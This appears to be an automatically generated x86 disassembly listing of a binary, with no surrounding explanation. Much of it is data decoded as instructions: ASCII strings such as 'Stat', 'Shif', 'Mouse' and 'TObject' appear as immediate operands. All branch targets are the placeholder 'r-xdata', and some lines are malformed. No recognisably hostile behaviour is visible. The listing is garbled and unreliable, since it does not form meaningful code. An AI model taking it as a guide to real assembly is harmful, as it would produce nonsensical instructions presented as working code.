add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx ] al
add [ ebx ] al
push esp
outsd
jo r-xdata
mov al [ 0x1403aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add al [ eax ]
add eax 0x68676952
imul ebp [ esi + 0x73 ] r-xdata
add al 0x7d
cmpsd [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add al 0x4c
outsb
lea eax [ bx + si ]
jl r-xdata
outsd
insd
lea eax [ eax ]
push eax
mov [ 0x3aa ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc edx
outsd
je r-xdata
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add eax [ eax ]
push es
outsd
insb
jae r-xdata
jge r-xdata
mov al [ 0xc03aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
mov [ 0x2003aa ] al
add [ eax ] al
in al dx
imul ebp [ fs : esi + 0x67 ] r-xdata
pushad
stosb [ edi ]
add eax [ edi ]
or [ eax + edx * 2 + 0x61 ] dl
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
add [ eax ] al
add [ eax ] eax
add edx [ edi + ebp * 2 + 0x70 ]
shl [ eax + 0x1003aa ] 0x1
mov al [ 0x45c803aa ]
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x294bfc59 ]
stosd [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
cmpsd [ esi ] [ edi ]
add edi esp
salc
stosd [ edi ]
add esi [ eax + ebx * 8 - 0x55 ]
add edi [ eax ]
fisubr [ ebx - 0x54298ffd ]
add ecx [ eax ]
push esp
push eax
popad
imul ebp [ fs : esi + 0x67 ] 0x7c00408d
mov [ 0x80703aa ] al
push esp
push eax
popad
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x56 ] ch
add esp [ eax ]
add [ eax ] al
add ah ch
je r-xdata
add ecx [ eax ]
add [ eax ] al
push [ eax ]
xlat
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
add al dl
mov al [ 0x803aa ]
add bh bh
xor bh dl
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp [ edx + ebp * 4 - 0x294bfc59 ]
stosd [ edi ]
add edi [ ebx + ebp * 4 - 0x552ffc59 ]
aam 0x45
add eax [ eax + eax ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
outsd
insb
jae r-xdata
adc [ esi - 0x59efc3fd ] ah
outsd
insd
lea eax [ eax ]
and [ ebx + 0xb0803aa ] ah
push esp
dec ebp
outsd
jne r-xdata
add ecx [ eax ]
add [ eax ] al
push [ eax ]
xlat
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 ] al
add al dl
mov al [ 0x803aa ]
add bh bh
xor bh dl
pop es
or [ esi ] al
push ebx
outsb
jb r-xdata
dec ebp
outsd
jbe r-xdata
jne r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
mov eax [ 0x403aa ]
or [ ebx + 0x6f ] al
outsb
je r-xdata
mov al [ 0xc03aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
popad
je r-xdata
inc ebp
jbe r-xdata
add ecx [ ebx - 0x555c6740 ]
add ecx [ eax ]
andps xmm1 [ ebp + 0x6f ]
cmpsb [ esi ] [ edi ]
outsb
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x4c
mov al [ 0x1003aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
je r-xdata
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
je r-xdata
jb r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
add eax 0x65530608
outsb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ ebx ] al
push esp
outsd
jo r-xdata
inc edx
outsd
je r-xdata
mov al [ 0x1403aa ]
add bh bh
xor bh dl
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
or [ esi ] cl
push esp
dec ebx
jns r-xdata
jbe r-xdata
js r-xdata
outsb
or al 0x54
dec ebp
outsd
or eax 0x73756f4d
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
add [ ebx ] eax
outsb
je r-xdata
add [ edx ] al
or [ esi ] al
cmpsd [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edx eax
inc edx
popad
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx + edx ] dl
push cs
push esp
dec ebp
outsd
jne r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
push ebx
push 0xb746669
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
adc [ esi + 0x408d03 ] ah
cmp al 0xa5
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc ebx
push 0x14007261
adc [ esi - 0x59efd7fd ] esp
add ecx [ ebp - 0x5ac3ffc0 ]
add ecx [ eax ]
push es
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
rcr [ ebp + 0x408d03aa ] 0x1
add [ esp + 0x90803aa ] dh
push esp
dec ebx
je r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
add ebp [ eax + 0x10 ]
add [ ecx + edx ] dl
add edx [ eax + r-xdata ]
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ ecx ] al
push esp
push ebx
dec ebp
outsd
jne r-xdata
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edx [ ecx + edx ]
dec edi
jbe r-xdata
add [ ebx ] eax
dec ebx
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
add ecx [ ebp - 0x5b4bffc0 ]
adc [ esi - 0x55622ffd ] ah
outsb
add [ 0x66696853 ] al
je r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x7803aa9d ]
jne r-xdata
push 0xb746669
jb r-xdata
jne r-xdata
je r-xdata
inc edx
jne r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
je r-xdata
inc esp
jb r-xdata
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
adc al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
add [ ecx ] al
push esp
push ebx
push 0x53746669
pop eax
pop es
dec ecx
outsb
je r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
popfd
stosb [ edi ]
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
push 0x53746669
je r-xdata
je r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add esp [ edi + edx * 4 - 0x5993fc56 ]
stosb [ edi ]
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
inc esp
jb r-xdata
jns r-xdata
jb r-xdata
stosb [ edi ]
add ecx [ eax ]
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
mov ah 0xa4
je r-xdata
push ebx
jb r-xdata
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
je r-xdata
je r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ esi + ebx * 4 - 0x56 ]
add eax [ eax ]
adc [ esi - 0x5a3b6ffd ] ah
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebp - 0x5c03ffc0 ]
stosb [ edi ]
add ecx [ eax ]
adc edx [ ebp + ecx * 2 + 0x6f ]
jne r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
push ebx
outsb
jb r-xdata
jb r-xdata
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
cmpsb [ esi ] [ edi ]
adc al 0x11
cmpsb [ esi ] [ edi ]
add edx [ ecx + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebp - 0x59dbffc0 ]
stosb [ edi ]
add ecx [ eax ]
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
adc [ esi - 0x59efc3fd ] esp
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ esi - 0x59efc3fd ] esp
add ecx [ eax ]
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x14 ] si
adc [ esi - 0x55685bfd ] esp
add ebp [ esi - 0x56 ]
push ebx
outsb
add al 0x8
push es
pop es
dec eax
imul esi [ esp + edx * 2 + 0x65 ] 0x49077473
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
adc al 0x11
cmpsb [ esi ] [ edi ]
add ecx [ eax - 0x66 ]
stosb [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebp - 0x58cfffc0 ]
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx eax
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add ecx [ eax ]
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add edx [ ecx + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
jns r-xdata
jb r-xdata
je r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] dl
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x7803aa9d ]
jne r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
jb r-xdata
push es
push ebx
outsb
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
cmpsb [ esi ] [ edi ]
add ecx [ eax - 0x66 ]
stosb [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ esi + ebx * 4 - 0x56 ]
add eax [ eax ]
adc [ esi - 0x583f6ffd ] ah
stosb [ edi ]
add ecx [ eax ]
or al 0x54
adc al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
outsb
push edx
jae r-xdata
sub [ esi + 0x3aa ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x5556fb40 ]
add ecx [ eax ]
andps xmm0 [ ebx + 0x61 ]
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x14 ] si
adc [ esi - 0x5565b7fd ] esp
add edi [ eax - 0x58 ]
stosb [ edi ]
add ecx [ eax ]
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x55557340 ]
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
scasb [ edi ]
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ esi + 0x4c08b03 ] ah
test eax 0xf0803aa
push esp
inc ebx
popad
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
scasb [ edi ]
stosb [ edi ]
add edx esp
mov bh 0xaa
add eax [ eax ]
adc [ esi - 0x5557d3fd ] ah
add ecx [ eax ]
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add ecx [ eax ]
push ss
push esp
dec ebp
outsd
jne r-xdata
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ esi - 0x733f74fd ] ah
stosb [ edi ]
stosb [ edi ]
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add ecx [ ebx - 0x5555fb40 ]
add ecx [ eax ]
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ esi - 0x59efc3fd ] ah
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x54 ] cl
stosb [ edi ]
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
adc al 0x11
cmpsb [ esi ] [ edi ]
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add edi [ eax + edx ]
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add esp [ edx + edx ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add [ eax ] al
sbb al 0x8b
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add esi eax
cmp eax 0x45d403a8
jo r-xdata
cmpsd [ esi ] [ edi ]
add [ ebx + ecx * 4 ] bl
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ esi + 0x408d03 ] ah
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add edi [ eax + edx ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
adc [ esi + 0x408d03 ] ah
je r-xdata
movsb [ edi ] [ esi ]
stosd [ edi ]
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 4 ] dh
stosb [ edi ]
add ebp [ esi + ebp * 4 ]
stosb [ edi ]
add eax [ eax ]
lea eax [ eax ]
jbe r-xdata
add ebx [ esi ]
scasb [ edi ]
stosb [ edi ]
add edx [ eax + 0x1c000001 ]
mov esp [ edi - 0x57c20ffd ]
add edx esp
inc ebp
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] dl
cmpsb [ esi ] [ edi ]
add edi [ eax + 0x75 ]
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
adc [ esi - 0x5554fffd ] ah
add ecx [ eax ]
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jb r-xdata
outsb
stosb [ edi ]
add ecx [ eax ]
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add esp eax
0x235c03aa 0x3ab
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_3aab3f0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebp - 0x4827fc56 ] dh
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
mov ch 0xaa
add eax esi
mov bh 0xaa
add ecx [ edx + eax ]
add [ eax - 0x55 ] bl
stosb [ edi ]
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add ebp [ edx + edx * 2 ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp ]
stosd [ edi ]
add ebx [ eax - 0x13fc5478 ]
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
[ ebx - 0x547d43fd ] ebp
add ecx eax
mov [ ebx - 0x5477ebfd ] ch
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
sub ebp [ ebx - 0x547767fd ]
add ebp esp
sub_3aab845
xchg edx eax
stosd [ edi ]
add ebx [ ebx - 0x55 ]
add esp [ eax ]
adc eax 0xaad003ab
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add ebp [ esi + ebp * 8 - 0x11e7fc56 ]
stosb [ edi ]
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
xchg edx eax
stosd [ edi ]
add ecx [ eax + 0xc ]
stosd [ edi ]
add eax [ esp + ecx - 0x55 ]
add edx [ ecx - 0x1397fc55 ]
stosb [ edi ]
